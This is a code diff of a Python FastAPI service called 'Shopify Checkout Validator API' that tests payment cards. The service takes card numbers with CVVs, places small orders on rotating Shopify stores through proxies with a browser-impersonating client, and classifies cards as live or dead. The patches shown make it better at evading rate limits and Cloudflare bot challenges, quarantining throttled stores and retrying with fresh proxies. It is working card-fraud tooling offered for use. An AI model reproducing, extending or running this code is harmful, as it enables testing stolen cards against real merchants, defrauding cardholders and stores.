@@ -1,26 +1,27 @@
 """
-Shopify Checkout Validator API — VPS Edition v3.8.3
+Shopify Checkout Validator API — VPS Edition v3.8.4
 
-Fully autonomous site selection with request-pool support:
-  - Bot makes ONE call per card; API rotates through the request's own
-    fallback_sites list (msh.py always sends it), falling back to the
-    file-based pool (SITES_FILE) if the request doesn't provide one.
-  - Preflight checks: blacklist, no-products, captcha, price ceiling,
-    lenient session check (only flags sites whose /cart/add.js fails).
-  - PROXY_STOP_CODES = {PROXY_ERROR} only (TIMEOUT rotates to next site).
-  - /auto-diagnostics exposes internal attempt statistics.
+v3.8.3 fixes:
+  #1  _fetch_products separates transport failures (PROXY_ERROR) from
+      "no products" so a dead proxy no longer poisons a site.
+  #2  _site_has_captcha only flags rendered challenges (title/body text).
+  #3  Session preflight uses SESSION_FAIL_TTL and only records True/False.
+  #4  Broad proxy-error detection in validate_card.
+  #5  Fixed NameError on the cart fallback path (`cr` now assigned).
+  #6  Fail hard on empty delivery_strategy.
 
-v3.8.3 fixes (2026-10):
-  #1  _fetch_products distinguishes transport failures (PROXY_ERROR) from
-      "no products" so a dead proxy no longer poisons a site for 30 min.
-  #2  _site_has_captcha only flags rendered challenge widgets, not mere
-      script-tag references (which every Shopify page contains).
-  #3  Session preflight uses SESSION_FAIL_TTL (120s) and only records
-      a confirmed failure (True/False), never a network-unknown (None).
-  #4  Broader proxy error detection in validate_card so msh.py can rotate.
-  #5  Fixed NameError: `cr` not defined on the cart fallback path.
-  #6  Fail hard on empty delivery_strategy instead of submitting a
-      malformed proposal (which surfaced as a fake site error).
+v3.8.4 patches:
+  P1  THROTTLED hard-quarantine (THROTTLE_COOLDOWN) — /products.json 429
+      quarantines the site AND auto-rotate short-circuits THROTTLED so the
+      bot rotates proxies instead of burning the whole candidate list.
+  P2  CAPTCHA detection only fires when the checkout page has NO session
+      token AND matches a genuine Cloudflare challenge signature.
+  P3  Failure cache uses FAIL_CACHE_TTL (default 1800s), success uses
+      CACHE_TTL (default 300s), via explicit expires_at field.
+  P4  PROXY_ERROR is never cached (proxy rotates per-card).
+  P5  _auto_validate does NOT fall back to quarantined sites — returns the
+      dominant skip reason (THROTTLED / NO_PRODUCT / …) so the bot retries
+      with a different proxy/pool instead of instantly failing every card.
 """
 
 import asyncio
@@ -38,7 +39,7 @@ from urllib.parse import urlparse
 from curl_cffi.requests import AsyncSession, RequestsError
 import orjson
 import uvicorn
-from fastapi import FastAPI, Query, Request
+from fastapi import FastAPI, Query
 from fastapi.middleware.cors import CORSMiddleware
 from fastapi.responses import JSONResponse
 from dotenv import load_dotenv
@@ -47,31 +48,30 @@ load_dotenv()
 # ---------------------------------------------------------------------------
 # Configuration
 # ---------------------------------------------------------------------------
-PORT                  = int(os.environ.get("PORT", 8080))
-WORKERS               = int(os.environ.get("WORKERS", 1))
-CARDS_FILE            = os.environ.get("CARDS_FILE", "cards.txt")
-SITES_FILE            = os.environ.get("SITES_FILE", "sites.txt")
-MAX_PRICE             = float(os.environ.get("MAX_PRICE", 5.0))
-MIN_AMOUNT            = float(os.environ.get("MIN_AMOUNT", 0.50))
-HARD_MAX_PRICE        = float(os.environ.get("HARD_MAX_PRICE", 20.0))
-SITE_CONCURRENCY      = int(os.environ.get("SITE_CONCURRENCY", 15))
-RACE_COUNT            = int(os.environ.get("RACE_COUNT", 3))
-AUTO_ATTEMPTS         = int(os.environ.get("AUTO_ATTEMPTS", 15))
-BLACKLIST_THRESHOLD   = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
-BLACKLIST_SAMPLES     = int(os.environ.get("BLACKLIST_SAMPLES", 8))
-BLACKLIST_SECONDS     = int(os.environ.get("BLACKLIST_SECONDS", 300))
-CACHE_TTL             = float(os.environ.get("CACHE_TTL", 300))
-VARIANT_TTL           = float(os.environ.get("VARIANT_TTL", 1800))
-REQUEST_TIMEOUT       = float(os.environ.get("REQUEST_TIMEOUT", 35))
-LOG_LEVEL             = os.environ.get("LOG_LEVEL", "warning").upper()
-LOG_FILE              = os.environ.get("LOG_FILE", "requests.txt")
-IMPERSONATE           = os.environ.get("IMPERSONATE", "chrome124")
-HEALTHY_MIN_SCORE     = float(os.environ.get("HEALTHY_MIN_SCORE", 0.20))
-NO_PRODUCT_TTL        = int(os.environ.get("NO_PRODUCT_TTL", 1800))
-
-# ═══ FIX #3 ═══ Session preflight failures get a SHORT cooldown (2 min),
-# not the full 30 min like a "site has no products" verdict.
-SESSION_FAIL_TTL      = int(os.environ.get("SESSION_FAIL_TTL", 120))
+PORT                = int(os.environ.get("PORT", 8080))
+WORKERS             = int(os.environ.get("WORKERS", 1))
+CARDS_FILE          = os.environ.get("CARDS_FILE", "cards.txt")
+SITES_FILE          = os.environ.get("SITES_FILE", "sites.txt")
+MAX_PRICE           = float(os.environ.get("MAX_PRICE", 5.0))
+MIN_AMOUNT          = float(os.environ.get("MIN_AMOUNT", 0.50))
+HARD_MAX_PRICE      = float(os.environ.get("HARD_MAX_PRICE", 20.0))
+SITE_CONCURRENCY    = int(os.environ.get("SITE_CONCURRENCY", 15))
+RACE_COUNT          = int(os.environ.get("RACE_COUNT", 3))
+AUTO_ATTEMPTS       = int(os.environ.get("AUTO_ATTEMPTS", 15))
+BLACKLIST_THRESHOLD = float(os.environ.get("BLACKLIST_THRESHOLD", 0.85))
+BLACKLIST_SAMPLES   = int(os.environ.get("BLACKLIST_SAMPLES", 8))
+BLACKLIST_SECONDS   = int(os.environ.get("BLACKLIST_SECONDS", 300))
+CACHE_TTL           = float(os.environ.get("CACHE_TTL", 300))
+VARIANT_TTL         = float(os.environ.get("VARIANT_TTL", 1800))
+REQUEST_TIMEOUT     = float(os.environ.get("REQUEST_TIMEOUT", 35))
+LOG_LEVEL           = os.environ.get("LOG_LEVEL", "warning").upper()
+LOG_FILE            = os.environ.get("LOG_FILE", "requests.txt")
+IMPERSONATE         = os.environ.get("IMPERSONATE", "chrome124")
+HEALTHY_MIN_SCORE   = float(os.environ.get("HEALTHY_MIN_SCORE", 0.20))
+NO_PRODUCT_TTL      = int(os.environ.get("NO_PRODUCT_TTL", 1800))
+SESSION_FAIL_TTL    = int(os.environ.get("SESSION_FAIL_TTL", 120))
+FAIL_CACHE_TTL      = float(os.environ.get("FAIL_CACHE_TTL", 1800))
+THROTTLE_COOLDOWN   = int(os.environ.get("THROTTLE_COOLDOWN", 900))
 
 VALID_API_KEYS = set(
     k.strip()
@@ -115,8 +115,8 @@ FINAL_CODES = frozenset({
     "LOST_CARD", "RESTRICTED_CARD",
 })
 
-# Only a genuine proxy failure stops rotation. TIMEOUT rotates to next site.
-PROXY_STOP_CODES = frozenset({"PROXY_ERROR"})
+# Codes that mean "stop rotating sites — the bot must rotate the proxy".
+PROXY_STOP_CODES = frozenset({"PROXY_ERROR", "THROTTLED"})
 
 LIVE_RESPONSES = frozenset({
     "ORDER_PLACED", "3DS_REQUIRED", "INSUFFICIENT_FUNDS",
@@ -131,9 +131,6 @@ logging.basicConfig(
 log = logging.getLogger("shopify")
 
 
-# ═══ FIX #4 ═══ Broad proxy-error detection — used everywhere a network
-# exception can occur, so a dead proxy reliably surfaces as PROXY_ERROR
-# instead of being silently swallowed or misclassified as a site error.
 PROXY_ERROR_HINTS = (
     "proxy", "tunnel", "407", "socks",
     "connection refused", "connection reset", "connection aborted",
@@ -155,7 +152,7 @@ def _looks_like_proxy_error(msg: str) -> bool:
 
 
 # ---------------------------------------------------------------------------
-# Request/Response logger
+# Request/response logger
 # ---------------------------------------------------------------------------
 import aiofiles
 import datetime
@@ -475,6 +472,7 @@ _site_quarantine: dict[str, dict] = defaultdict(lambda: {
     "can_create_session":       None,
     "session_checked_at":       0.0,
     "last_success_at":          0.0,
+    "throttled_until":          0.0,
 })
 
 _site_ua: dict[str, str] = {}
@@ -493,6 +491,44 @@ _stats: dict[str, int] = defaultdict(int)
 
 
 # ---------------------------------------------------------------------------
+# Cache helpers (PATCH P3)
+# ---------------------------------------------------------------------------
+def _cache_get(hostname: str) -> Optional[dict]:
+    cached = _product_cache.get(hostname)
+    if not cached:
+        return None
+    now = time.time()
+    expiry = cached.get("expires_at")
+    if expiry is None:
+        expiry = cached.get("ts", 0) + CACHE_TTL
+    return cached if now < expiry else None
+
+
+def _cache_write_success(hostname: str, product: Optional[dict],
+                         candidates: list[dict]) -> None:
+    _product_cache[hostname] = {
+        "product": product,
+        "candidates": candidates,
+        "err": None,
+        "ts": time.time(),
+    }
+
+
+def _cache_write_failure(hostname: str, err: str,
+                         ttl: Optional[float] = None) -> None:
+    if ttl is None:
+        ttl = FAIL_CACHE_TTL
+    now = time.time()
+    _product_cache[hostname] = {
+        "product": None,
+        "candidates": [],
+        "err": err,
+        "ts": now,
+        "expires_at": now + ttl,
+    }
+
+
+# ---------------------------------------------------------------------------
 # Lifespan
 # ---------------------------------------------------------------------------
 @asynccontextmanager
@@ -504,9 +540,12 @@ async def lifespan(app: FastAPI):
     _reload_cards()
     _reload_site_pool()
     log.warning(
-        "Shopify Validator API v3.8.3 started concurrency=%d/site keys=%d race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d session_ttl=%ds",
+        "Shopify Validator API v3.8.4 started concurrency=%d/site keys=%d "
+        "race=%d pool=%d impersonate=%s hard_max=$%.2f auto_attempts=%d "
+        "session_ttl=%ds fail_cache=%ds throttle=%ds",
         SITE_CONCURRENCY, len(VALID_API_KEYS), RACE_COUNT, len(_site_pool),
         IMPERSONATE, HARD_MAX_PRICE, AUTO_ATTEMPTS, SESSION_FAIL_TTL,
+        FAIL_CACHE_TTL, THROTTLE_COOLDOWN,
     )
     asyncio.create_task(_warmup_sites())
     asyncio.create_task(_pool_refresher())
@@ -517,7 +556,7 @@ async def lifespan(app: FastAPI):
             await res
 
 
-app = FastAPI(title="Shopify Validator", version="3.8.3", lifespan=lifespan)
+app = FastAPI(title="Shopify Validator", version="3.8.4", lifespan=lifespan)
 app.add_middleware(
     CORSMiddleware,
     allow_origins=["*"],
@@ -830,6 +869,9 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     if not q:
         return True, ""
 
+    if now < q.get("throttled_until", 0):
+        return False, "THROTTLED"
+
     if q.get("has_products") is False:
         age = now - q.get("has_products_checked_at", 0)
         if age < NO_PRODUCT_TTL:
@@ -845,8 +887,6 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     if cp is not None and cp > HARD_MAX_PRICE and (now - cpa) < NO_PRODUCT_TTL:
         return False, f"PRICE_TOO_HIGH: cheapest ${cp:.2f} > ${HARD_MAX_PRICE:.2f}"
 
-    # ═══ FIX #3 ═══ Session preflight uses the shorter SESSION_FAIL_TTL so a
-    # transient failure doesn't disable a site for a full 30 minutes.
     if q.get("can_create_session") is False:
         age = now - q.get("session_checked_at", 0)
         if age < SESSION_FAIL_TTL:
@@ -855,20 +895,7 @@ def _site_usable(hostname: str) -> tuple[bool, str]:
     return True, ""
 
 
-def _site_has_products(hostname: str) -> Optional[bool]:
-    q = _site_quarantine.get(hostname)
-    if not q:
-        return None
-    checked = q.get("has_products_checked_at", 0)
-    if not checked:
-        return None
-    if (time.time() - checked) > NO_PRODUCT_TTL:
-        return None
-    return q.get("has_products")
-
-
 def _record_site_result(hostname: str, response_code: str) -> None:
-    # ═══ FIX #4 ═══ Never count a proxy error against the site's health.
     if response_code in PROXY_STOP_CODES:
         return
 
@@ -916,9 +943,6 @@ def _record_site_result(hostname: str, response_code: str) -> None:
             q["has_products_checked_at"] = time.time()
 
 
-# ---------------------------------------------------------------------------
-# Adaptive variant selection
-# ---------------------------------------------------------------------------
 def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dict]:
     if not candidates:
         return None
@@ -939,16 +963,9 @@ def _preferred_variant(candidates: list[dict], max_price: float) -> Optional[dic
 
 
 # ---------------------------------------------------------------------------
-# Captcha preflight
+# Captcha preflight — PATCH P2
 # ---------------------------------------------------------------------------
 async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
-    """
-    ═══ FIX #2 ═══
-    Only flags a site when an actual challenge widget is RENDERED.
-    Mere script-tag references (hcaptcha, recaptcha, cf-challenge,
-    challenge-platform) appear on nearly every modern Shopify store
-    and are no longer treated as evidence of a challenge.
-    """
     try:
         r = await session.get(
             base_url,
@@ -956,43 +973,49 @@ async def _site_has_captcha(base_url: str, session: LoggedSession) -> bool:
             timeout=12,
             headers=_ua_headers(random.choice(USER_AGENTS)),
         )
+
+        if r.status_code in (403, 503):
+            body = (r.text or "")[:8000].lower()
+            if any(k in body for k in (
+                "cf-challenge", "cf-browser-verification",
+                "just a moment", "attention required",
+                "checking your browser", "ddos protection by cloudflare",
+                "enable javascript and cookies to continue",
+            )):
+                return True
+            return False
+
         if r.status_code != 200:
             return False
-        text = (r.text or "")[:12000].lower()
-        strong = (
-            # rendered widgets
-            'class="h-captcha"', 'h-captcha-response',
-            'class="g-recaptcha"', 'data-sitekey="6l',
-            "data-cf-challenge", "cf-turnstile-widget",
-            # explicit challenge text
-            "please verify you are a human",
-            "checking your browser before accessing",
-            "verify you are human",
-            "press & hold", "press and hold",
-            "are you a robot",
+
+        body = (r.text or "")[:8000].lower()
+
+        hard_signals = (
+            "<title>just a moment...</title>",
+            "<title>attention required! | cloudflare</title>",
+            "<title>access denied</title>",
+            ">verify you are human<",
+            ">please verify you are a human<",
+            ">press &amp; hold<",
+            ">press and hold<",
+            ">checking your browser before accessing<",
+            ">please wait while we verify your browser<",
+            ">enable javascript and cookies to continue<",
         )
-        return any(k in text for k in strong)
+        return any(k in body for k in hard_signals)
     except Exception as ex:
-        # Network failure => can't tell, so don't flag
         log.debug("[_site_has_captcha] %s -> %s", base_url, ex)
         return False
 
 
 # ---------------------------------------------------------------------------
-# Session-token preflight (LENIENT)
+# Session-token preflight
 # ---------------------------------------------------------------------------
 async def _check_session_creation(
     base_url: str,
     variant_id: str,
     session: LoggedSession,
 ) -> Optional[bool]:
-    """
-    ═══ FIX #3 ═══
-    Returns:
-      True  → confirmed works
-      False → confirmed fail (site requires login, or cart truly rejected)
-      None  → couldn't determine (network/proxy error) — do NOT quarantine
-    """
     if not variant_id:
         return None
 
@@ -1043,8 +1066,6 @@ async def _check_session_creation(
             continue
 
     if not cart_ok:
-        # If we couldn't reach the site, this is a proxy issue — do NOT
-        # record a definitive failure.
         if network_error:
             return None
         return False
@@ -1089,13 +1110,13 @@ async def _fetch_products(
     hostname = urlparse(base_url).netloc
     now = time.time()
 
-    cached = _product_cache.get(hostname)
-    if cached and (now - cached["ts"]) < CACHE_TTL:
+    cached = _cache_get(hostname)
+    if cached:
         return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
     async with _host_locks[hostname]:
-        cached = _product_cache.get(hostname)
-        if cached and (time.time() - cached["ts"]) < CACHE_TTL:
+        cached = _cache_get(hostname)
+        if cached:
             return cached.get("product"), cached.get("candidates", []), cached.get("err")
 
         own_session = session is None
@@ -1103,9 +1124,6 @@ async def _fetch_products(
             session, _ = _make_session(proxy_str)
 
         try:
-            # ═══ FIX #1 ═══ Track transport failures separately from a real
-            # "site has no products" verdict. A dead proxy must NOT quarantine
-            # the site for 30 min.
             all_variants: list[dict] = []
             transport_error = False
             urls_to_try = [
@@ -1123,7 +1141,11 @@ async def _fetch_products(
                             all_variants = products
                             break
                     elif resp.status_code in (429, 430):
-                        _product_cache[hostname] = {"product": None, "candidates": [], "err": "THROTTLED", "ts": now}
+                        _cache_write_failure(hostname, "THROTTLED",
+                                             ttl=THROTTLE_COOLDOWN)
+                        _site_quarantine[hostname]["throttled_until"] = (
+                            time.time() + THROTTLE_COOLDOWN
+                        )
                         return None, [], "THROTTLED"
                 except Exception as ex:
                     if _looks_like_proxy_error(str(ex)):
@@ -1159,14 +1181,7 @@ async def _fetch_products(
                         if price <= max_price:
                             candidates.append(entry)
 
-            # ═══ FIX #1 ═══ If we couldn't reach the site AND we didn't
-            # get products back, this is a PROXY problem, not a site problem.
-            # Skip the quarantine and surface PROXY_ERROR so the caller can
-            # rotate the proxy.
             if transport_error and not all_variants:
-                _product_cache[hostname] = {
-                    "product": None, "candidates": [], "err": "PROXY_ERROR", "ts": now,
-                }
                 return None, [], "PROXY_ERROR"
 
             q = _site_quarantine[hostname]
@@ -1174,7 +1189,7 @@ async def _fetch_products(
             q["has_products_checked_at"] = time.time()
 
             if not candidates and cheapest_any is None:
-                _product_cache[hostname] = {"product": None, "candidates": [], "err": "No products found", "ts": now}
+                _cache_write_failure(hostname, "No products found")
                 return None, [], "No products found"
 
             last_cap_check = q.get("captcha_checked_at", 0)
@@ -1187,45 +1202,42 @@ async def _fetch_products(
 
             if q.get("has_captcha") is True:
                 err = "CAPTCHA_REQUIRED"
-                _product_cache[hostname] = {
-                    "product": None, "candidates": [], "err": err, "ts": now,
-                }
+                _cache_write_failure(hostname, err)
                 return None, [], err
 
             if cheapest_any_price != float("inf"):
                 q["cheapest_price"] = cheapest_any_price
                 q["cheapest_checked_at"] = now
                 if cheapest_any_price > HARD_MAX_PRICE:
-                    err = f"PRICE_TOO_HIGH: cheapest ${cheapest_any_price:.2f} > ${HARD_MAX_PRICE:.2f}"
+                    err = (f"PRICE_TOO_HIGH: cheapest ${cheapest_any_price:.2f} "
+                           f"> ${HARD_MAX_PRICE:.2f}")
                     q["has_products"] = False
                     q["has_products_checked_at"] = now
-                    log.warning("[preflight] %s cheapest $%.2f > $%.2f — skipping site",
-                                hostname, cheapest_any_price, HARD_MAX_PRICE)
-                    _product_cache[hostname] = {
-                        "product": None, "candidates": [], "err": err, "ts": now,
-                    }
+                    log.warning(
+                        "[preflight] %s cheapest $%.2f > $%.2f — skipping site",
+                        hostname, cheapest_any_price, HARD_MAX_PRICE,
+                    )
+                    _cache_write_failure(hostname, err)
                     return None, [], err
 
             if cheapest_any is not None:
                 last_st_check = q.get("session_checked_at", 0)
-                # ═══ FIX #3 ═══ Use SESSION_FAIL_TTL, not NO_PRODUCT_TTL
                 if (now - last_st_check) > SESSION_FAIL_TTL:
                     can_session = await _check_session_creation(
                         base_url, cheapest_any["variant_id"], session
                     )
-                    # ═══ FIX #3 ═══ Only record True/False. A None (unknown
-                    # due to network) must NOT poison the quarantine state.
                     if can_session is not None:
                         q["can_create_session"] = can_session
                     q["session_checked_at"] = now
                     if can_session is False:
-                        log.warning("[preflight] %s cart-add failed — skipping site", hostname)
+                        log.warning(
+                            "[preflight] %s cart-add failed — skipping site",
+                            hostname,
+                        )
 
                 if q.get("can_create_session") is False:
                     err = "NO_SESSION_TOKEN"
-                    _product_cache[hostname] = {
-                        "product": None, "candidates": [], "err": err, "ts": now,
-                    }
+                    _cache_write_failure(hostname, err)
                     return None, [], err
 
             if not candidates:
@@ -1233,17 +1245,10 @@ async def _fetch_products(
 
             best = _preferred_variant(candidates, max_price)
 
-            _product_cache[hostname] = {
-                "product":    best,
-                "candidates": candidates,
-                "err":        None,
-                "ts":         now,
-            }
+            _cache_write_success(hostname, best, candidates)
             return best, candidates, None
 
         except (asyncio.TimeoutError, RequestsError) as ex:
-            # ═══ FIX #1/#4 ═══ Transport exception at the outer level — check
-            # if it's a proxy error before falling back to "Timeout".
             if _looks_like_proxy_error(str(ex)):
                 return None, [], "PROXY_ERROR"
             return None, [], "Timeout"
@@ -1350,9 +1355,10 @@ async def validate_card(
                 )
                 if not all_candidates and not best:
                     err_str = (err or "No products available")
-                    # ═══ FIX #1 ═══ Surface PROXY_ERROR explicitly so the
-                    # caller rotates the proxy rather than blacklisting a
-                    # perfectly good site.
+                    if err_str == "THROTTLED":
+                        return _r("THROTTLED",
+                                  message="Products endpoint rate-limited",
+                                  is_site_error=True)
                     if err_str == "PROXY_ERROR":
                         return _r("PROXY_ERROR",
                                   message="Proxy/network failure during product fetch",
@@ -1433,15 +1439,13 @@ async def validate_card(
                 except Exception:
                     continue
 
-            # ═══ FIX #5 ═══ Assign `cr` on the fallback path too, so the
-            # subsequent `dict(cr.headers)` call doesn't raise NameError.
             if not cart_added:
                 try:
                     r = await session.get(f"{ourl}/checkout", allow_redirects=True,
                                           headers=_ua_headers(ua))
                     if r.status_code == 200 and "checkouts/cn/" in str(r.url):
                         cart_added = True
-                        cr = r                                   # ← FIX #5
+                        cr = r
                         checkout_url = str(r.url)
                         page_text = r.text
                     else:
@@ -1481,16 +1485,6 @@ async def validate_card(
                     or ('name="password"' in early and "login" in lower_url)):
                 return _r("SITE_REQUIRES_LOGIN", message="Store is password-protected", is_site_error=True)
 
-            # Note: captcha detection here uses the same strong signals as
-            # _site_has_captcha. The checkout page IS authoritative.
-            if any(k in early for k in (
-                'class="h-captcha"', 'class="g-recaptcha"',
-                "please verify you are a human",
-                "verify you are human",
-                "checking your browser before accessing",
-            )):
-                return _r("CAPTCHA_REQUIRED", message="Bot challenge detected", is_site_error=True)
-
             m = re.search(r"/checkouts/cn/([^/?#]+)", checkout_url)
             if m:
                 attempt_token = m.group(1)
@@ -1500,8 +1494,23 @@ async def validate_card(
                 return _r("NO_ATTEMPT_TOKEN", message="No attempt token in URL", is_site_error=True)
 
             sst = _extract_sst(page_text, dict(cr.headers))
+
             if not sst:
-                return _r("NO_SESSION_TOKEN", message="No session token in HTML", is_site_error=True)
+                early_lower = page_text[:5000].lower()
+                strong_challenge = any(k in early_lower for k in (
+                    "<title>just a moment...</title>",
+                    "<title>attention required! | cloudflare</title>",
+                    ">verify you are human<",
+                    ">please verify you are a human<",
+                    ">checking your browser before accessing<",
+                ))
+                if strong_challenge:
+                    return _r("CAPTCHA_REQUIRED",
+                              message="Cloudflare challenge at checkout",
+                              is_site_error=True)
+                return _r("NO_SESSION_TOKEN",
+                          message="No session token in HTML",
+                          is_site_error=True)
 
             queue_token = (
                 _extract(page_text, 'queueToken&quot;:&quot;', "&quot;") or
@@ -1863,17 +1872,11 @@ async def validate_card(
                         except (ValueError, TypeError):
                             pass
             except Exception as ex:
-                # ═══ FIX #6 ═══ Upgrade debug to warning so failures are
-                # visible; DO NOT return early here — the empty-strategy
-                # check below catches the true failure case.
                 if _looks_like_proxy_error(str(ex)):
                     return _r("PROXY_ERROR", message=str(ex)[:120],
                               proxy_dead=True, is_site_error=True)
                 log.warning("delivery proposal failed for %s: %s", hostname, ex)
 
-            # ═══ FIX #6 ═══ Refuse to submit a proposal with an empty
-            # delivery_strategy — that always produces a fake site error
-            # (SubmitRejected / NO_SELLER_PROPOSAL) at the next step.
             if not delivery_strategy:
                 return _r("NO_SELLER_PROPOSAL",
                           message="No delivery strategy from shipping/delivery proposal",
@@ -2165,7 +2168,6 @@ async def validate_card(
         except Exception as ex:
             log.debug("validate_card exception: %s", ex, exc_info=True)
             err_str = f"{type(ex).__name__}: {str(ex)[:100]}"
-            # ═══ FIX #4 ═══ Broad proxy detection so msh.py rotates.
             if _looks_like_proxy_error(err_str):
                 return _r("PROXY_ERROR", message=err_str,
                           proxy_dead=True, is_site_error=True)
@@ -2178,7 +2180,7 @@ async def validate_card(
 
 
 # ---------------------------------------------------------------------------
-# Auto-validate — rotates through the request pool, then the file pool
+# Auto-validate — PATCH P5: never fall back to quarantined sites
 # ---------------------------------------------------------------------------
 async def _auto_validate(
     cc: str, month: str, year: str, cvv: str,
@@ -2214,21 +2216,50 @@ async def _auto_validate(
         }
 
     candidates: list[str] = []
+    skip_reasons: dict[str, int] = {}
     for site in source_pool:
         if site in exclude_set:
             continue
         host = urlparse(site if site.startswith("http") else f"https://{site}").netloc
-        usable, _ = _site_usable(host)
+
+        pc = _product_cache.get(host)
+        if pc and pc.get("err") == "THROTTLED":
+            expiry = pc.get("expires_at", pc.get("ts", 0) + CACHE_TTL)
+            if time.time() < expiry:
+                skip_reasons["THROTTLED"] = skip_reasons.get("THROTTLED", 0) + 1
+                continue
+
+        usable, reason = _site_usable(host)
         if usable:
             candidates.append(site)
+        else:
+            code = reason.split(":")[0].strip() if ":" in reason else reason
+            skip_reasons[code] = skip_reasons.get(code, 0) + 1
 
     if not candidates:
-        candidates = [s for s in source_pool if s not in exclude_set]
-
-    if not candidates:
+        if not skip_reasons:
+            return {
+                "Response": "SITE_ERROR",
+                "Message": "All sites excluded",
+                "Status": False,
+                "Gateway": "Shopify Payments",
+                "Price": "0.00",
+                "Proxy": "Live",
+                "Retry": True,
+                "Time": f"{round(time.time() - t0, 2)}s",
+            }
+        top_reason = max(skip_reasons, key=skip_reasons.get)
+        breakdown = ", ".join(
+            f"{k}:{v}" for k, v in sorted(skip_reasons.items(), key=lambda x: -x[1])[:6]
+        )
+        _stats[f"auto_pool_empty_{top_reason}"] += 1
+        log.warning(
+            "[auto] all %d sites quarantined (%s) — returning %s so bot retries",
+            len(source_pool), breakdown, top_reason,
+        )
         return {
-            "Response": "SITE_ERROR",
-            "Message": "All sites excluded",
+            "Response": top_reason,
+            "Message": f"All {len(source_pool)} sites quarantined ({breakdown})",
             "Status": False,
             "Gateway": "Shopify Payments",
             "Price": "0.00",
@@ -2260,9 +2291,6 @@ async def _auto_validate(
 
         _stats[f"auto_site_{code}"] += 1
 
-        # ═══ FIX #4 ═══ Don't count proxy errors or hard-dead responses
-        # against the site's reputation. _record_site_result already skips
-        # PROXY_ERROR internally, but skipping here is cheaper and clearer.
         if code not in HARD_DEAD_CODES and code not in PROXY_STOP_CODES:
             _record_site_result(host, code)
 
@@ -2273,7 +2301,8 @@ async def _auto_validate(
             return result
 
         if code in PROXY_STOP_CODES:
-            log.info("[auto] proxy error on %s — returning so bot can rotate", host)
+            _stats[f"auto_early_exit_{code}"] += 1
+            log.info("[auto] %s on %s — returning so bot rotates proxy", code, host)
             return result
 
         log.info("[auto] attempt %d/%d: %s -> %s, trying next site",
@@ -2294,7 +2323,7 @@ async def _auto_validate(
 
 
 # ---------------------------------------------------------------------------
-# Multi-site racing (compatibility)
+# Multi-site racing
 # ---------------------------------------------------------------------------
 async def validate_card_raced(
     cc: str, month: str, year: str, cvv: str,
@@ -2398,7 +2427,6 @@ async def shopify_route(
     )
     primary_host = urlparse(primary.get("Site") or site).netloc
     primary_code = str(primary.get("Response", "")).upper()
-    # ═══ FIX #4 ═══ Never blame the site for a proxy failure.
     if primary_code not in PROXY_STOP_CODES:
         _record_site_result(primary_host, primary_code)
 
@@ -2508,7 +2536,6 @@ async def check_route(
     })
 
 
-# ── AUTO DIAGNOSTICS ──────────────────────────────────────────────────────
 @app.get("/auto-diagnostics")
 async def auto_diagnostics_route():
     total_cards = _stats.get("auto_total_cards", 0)
@@ -2516,14 +2543,19 @@ async def auto_diagnostics_route():
     first_try_success = _stats.get("auto_first_try_success", 0)
     request_pool_used = _stats.get("auto_request_pool_used", 0)
     file_pool_used = _stats.get("auto_file_pool_used", 0)
+    early_exit_proxy = _stats.get("auto_early_exit_PROXY_ERROR", 0)
+    early_exit_throttled = _stats.get("auto_early_exit_THROTTLED", 0)
 
     code_breakdown = {}
     pool_size_distribution = {}
+    pool_empty_breakdown = {}
     for k, v in _stats.items():
         if k.startswith("auto_site_"):
             code_breakdown[k[len("auto_site_"):]] = v
         elif k.startswith("auto_request_pool_size_"):
             pool_size_distribution[k[len("auto_request_pool_size_"):]] = v
+        elif k.startswith("auto_pool_empty_"):
+            pool_empty_breakdown[k[len("auto_pool_empty_"):]] = v
 
     live_pool = sum(
         1 for s in _site_pool
@@ -2533,21 +2565,23 @@ async def auto_diagnostics_route():
     )
 
     return JSONResponse({
-        "total_cards_processed":  total_cards,
-        "total_site_attempts":    total_attempts,
-        "avg_attempts_per_card":  round(total_attempts / total_cards, 2) if total_cards else 0,
-        "first_try_success":      first_try_success,
-        "first_try_rate":         f"{first_try_success / total_cards * 100:.1f}%" if total_cards else "0%",
-        "request_pool_used":      request_pool_used,
-        "file_pool_used":         file_pool_used,
-        "request_pool_sizes":     pool_size_distribution,
-        "internal_site_codes":    code_breakdown,
-        "file_pool_live":         live_pool,
-        "file_pool_total":        len(_site_pool),
+        "total_cards_processed":   total_cards,
+        "total_site_attempts":     total_attempts,
+        "avg_attempts_per_card":   round(total_attempts / total_cards, 2) if total_cards else 0,
+        "first_try_success":       first_try_success,
+        "first_try_rate":          f"{first_try_success / total_cards * 100:.1f}%" if total_cards else "0%",
+        "request_pool_used":       request_pool_used,
+        "file_pool_used":          file_pool_used,
+        "early_exit_proxy_error":  early_exit_proxy,
+        "early_exit_throttled":    early_exit_throttled,
+        "request_pool_sizes":      pool_size_distribution,
+        "pool_empty_breakdown":    pool_empty_breakdown,
+        "internal_site_codes":     code_breakdown,
+        "file_pool_live":          live_pool,
+        "file_pool_total":         len(_site_pool),
     })
 
 
-# ── REAL-TIME site stats ────────────────────────────────────────────────────
 @app.get("/site-stats")
 async def site_stats_route():
     now = time.time()
@@ -2574,10 +2608,13 @@ async def site_stats_route():
         hca = q.get("captcha_checked_at")
         cs = q.get("can_create_session")
         csa = q.get("session_checked_at")
+        throttled_until = q.get("throttled_until", 0)
 
         skip_reason = None
         if blacklisted:
             skip_reason = "blacklisted"
+        elif now < throttled_until:
+            skip_reason = f"throttled ({int(throttled_until - now)}s left)"
         elif hc is True and hca and (now - hca) < NO_PRODUCT_TTL:
             skip_reason = "captcha"
         elif cp is not None and cp > HARD_MAX_PRICE and cpa and (now - cpa) < NO_PRODUCT_TTL:
@@ -2595,6 +2632,8 @@ async def site_stats_route():
             "error_count":          s.get("error_count", 0),
             "blacklisted":          blacklisted,
             "blacklist_remaining":  max(0, int(s.get("blacklisted_until", 0) - now)),
+            "throttled":            now < throttled_until,
+            "throttle_remaining":   max(0, int(throttled_until - now)),
             "has_products":         hp,
             "has_products_age_sec": hp_age,
             "cheapest_price":       cp,
@@ -2612,7 +2651,6 @@ async def site_stats_route():
     return JSONResponse(out)
 
 
-# ── HEALTHY SITES POOL ──────────────────────────────────────────────────────
 @app.get("/healthy-sites")
